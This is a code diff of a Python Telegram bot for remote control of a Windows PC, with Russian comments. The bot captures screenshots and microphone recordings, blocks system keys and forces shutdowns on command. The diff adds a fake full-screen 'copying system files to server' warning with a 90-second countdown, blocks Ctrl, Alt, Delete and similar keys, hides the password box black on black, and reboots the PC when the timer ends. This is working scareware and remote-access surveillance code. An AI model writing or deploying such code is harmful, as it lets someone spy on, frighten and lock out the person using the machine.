@@ -23,31 +23,29 @@ session = AiohttpSession()
 bot = Bot(token=API_TOKEN, session=session)
 dp = Dispatcher()
 
-# Глобальная переменная для отслеживания состояния блокировки клавиш
+# Состояние блокировки
 keys_blocked = False
-blocked_list = ['windows', 'alt', 'tab', 'esc' ,'1' ,'2' ,'3','w' ,'a']
+blocked_list = ['windows', 'alt', 'tab', 'esc', '1', '2', '3', 'w', 'a']
 
 # --- ФУНКЦИИ УПРАВЛЕНИЯ ---
 
 def close_active_window():
-    """Имитирует нажатие Alt+F4 для закрытия текущего окна"""
     pyautogui.hotkey('alt', 'f4')
 
 def toggle_keys():
-    """Включает или выключает блокировку системных клавиш"""
     global keys_blocked
     if not keys_blocked:
         for key in blocked_list:
             try: keyboard.block_key(key)
             except: pass
         keys_blocked = True
-        return "🚫 Клавиши (Win, Alt, Tab) ЗАБЛОКИРОВАНЫ"
+        return "🚫 Клавиши ЗАБЛОКИРОВАНЫ"
     else:
         keyboard.unhook_all()
         keys_blocked = False
         return "✅ Клавиши РАЗБЛОКИРОВАНЫ"
 
-# --- ОКНО БЛОКИРОВКИ (ЭКРАН) ---
+# --- ОКНО ИМИТАЦИИ КОПИРОВАНИЯ И БЛОКИРОВКИ ---
 
 def show_secure_lock():
     pyautogui.press('volumemute')
@@ -57,45 +55,68 @@ def show_secure_lock():
     root.config(cursor="none")
     root.protocol("WM_DELETE_WINDOW", lambda: None)
     
-    # Временная жесткая блокировка для окна
+    # Жесткая блокировка клавиш на время работы окна
     for k in ['windows', 'alt', 'tab', 'esc', 'ctrl', 'delete']:
         try: keyboard.block_key(k)
         except: pass
 
-    tk.Label(root, text="ACCESS DENIED\nEnter Admin Password:", 
-             fg="red", bg="black", font=("Arial", 28, "bold")).pack(expand=True)
+    # Текстовые элементы
+    tk.Label(root, text="SYSTEM STATUS: CRITICAL", 
+             fg="red", bg="black", font=("Courier New", 14)).pack(pady=20)
 
-    pwd_entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center', bg="#222", fg="white")
-    pwd_entry.pack(pady=20)
+    label_main = tk.Label(root, text="КОПИРОВАНИЕ ФАЙЛОВ СИСТЕМЫ НА СЕРВЕР...", 
+                          fg="#00FF00", bg="black", font=("Courier New", 28, "bold"))
+    label_main.pack(expand=True)
+
+    label_timer = tk.Label(root, text="Инициализация перезагрузки через: 90 сек", 
+                           fg="gray", bg="black", font=("Courier New", 18))
+    label_timer.pack(pady=40)
+
+    # Скрытое поле ввода пароля (черное на черном)
+    pwd_entry = tk.Entry(root, show="*", font=("Arial", 1), bg="black", fg="black", borderwidth=0, insertontime=0)
+    pwd_entry.pack()
     pwd_entry.focus_force()
+
+    remaining_time = 90
+
+    def update_timer():
+        nonlocal remaining_time
+        if remaining_time > 0:
+            remaining_time -= 1
+            label_timer.config(text=f"Инициализация перезагрузки через: {remaining_time} сек")
+            root.after(1000, update_timer)
+        else:
+            # Команда на перезагрузку Windows
+            os.system("shutdown /r /t 0")
 
     def check_pwd(event=None):
         if pwd_entry.get() == LOCK_PASSWORD:
             keyboard.unhook_all()
             global keys_blocked
-            keys_blocked = False # Сбрасываем флаг при разблокировке
+            keys_blocked = False
             pyautogui.press('volumemute')
             root.destroy()
         else:
             pwd_entry.delete(0, tk.END)
 
     pwd_entry.bind('<Return>', check_pwd)
+    
+    # Запуск таймера
+    root.after(1000, update_timer)
     root.mainloop()
 
 # --- КНОПКИ ТЕЛЕГРАМ ---
 
 def get_keyboard():
-    # Текст кнопки меняется в зависимости от состояния
     lock_text = "🔓 Заблокировать клавиши" if not keys_blocked else "🔒 Разблокировать клавиши"
-    
     buttons = [
         [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot")],
         [InlineKeyboardButton(text="❌ Закрыть активное окно", callback_data="close_window")],
         [InlineKeyboardButton(text=lock_text, callback_data="toggle_keys")],
         [InlineKeyboardButton(text="🎙 Запись (10с)", callback_data="record"),
          InlineKeyboardButton(text="🔇 Звук (Mute)", callback_data="mute")],
-        [InlineKeyboardButton(text="🔒 Блок ПК (Экран)", callback_data="lock_now")],
-        [InlineKeyboardButton(text="🔌 Выключить", callback_data="shutdown")]
+        [InlineKeyboardButton(text="🛡 ЗАПУСК КОПИРОВАНИЯ + РЕБУТ", callback_data="lock_now")],
+        [InlineKeyboardButton(text="🔌 Выключить ПК", callback_data="shutdown")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -104,7 +125,6 @@ async def handle_callbacks(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID: return
     
     data = callback.data
-    # Отвечаем на callback сразу, чтобы не было ошибки "query is too old"
     try: await callback.answer()
     except: pass
 
@@ -120,7 +140,6 @@ async def handle_callbacks(callback: types.CallbackQuery):
 
     elif data == "toggle_keys":
         status = toggle_keys()
-        # Обновляем клавиатуру, чтобы текст на кнопке изменился
         await callback.message.edit_reply_markup(reply_markup=get_keyboard())
         await bot.send_message(ADMIN_ID, status)
 
@@ -136,14 +155,18 @@ async def handle_callbacks(callback: types.CallbackQuery):
         pyautogui.press('volumemute')
 
     elif data == "lock_now":
+        await bot.send_message(ADMIN_ID, "⚠️ Запущен процесс 'Копирование + Ребут' на 90 секунд.")
+        # Запуск окна в отдельном потоке, чтобы бот не завис
         asyncio.get_event_loop().run_in_executor(None, show_secure_lock)
 
     elif data == "shutdown":
         os.system("shutdown /s /t 0")
 
 async def main():
-    try: await bot.send_message(ADMIN_ID, "💻 Бот готов к работе", reply_markup=get_keyboard())
-    except: pass
+    try: 
+        await bot.send_message(ADMIN_ID, "💻 Бот готов к работе. Ожидание команд...", reply_markup=get_keyboard())
+    except Exception as e:
+        print(f"Ошибка при запуске: {e}")
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
